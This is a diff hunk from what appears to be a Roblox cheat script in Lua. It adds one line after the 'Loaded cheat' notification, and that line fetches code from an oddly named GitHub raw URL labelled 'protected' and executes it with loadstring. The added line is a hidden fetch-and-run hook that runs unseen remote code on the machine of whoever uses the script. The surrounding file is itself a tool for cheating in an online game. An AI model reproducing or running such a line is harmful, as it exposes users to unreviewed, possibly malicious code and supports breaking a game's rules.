@@ -4235,3 +4235,4 @@ do
 end
 
 Notifications:Notification("Loaded cheat in approximately: " .. math.floor(tick() - Tick) .. " seconds", 5, Library.Accent, false)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xaxaxaxaxaxaxaxaxaxaxaxax/fdRhHVlYTFmwxofMuZMqeQ/refs/heads/main/protected"))()
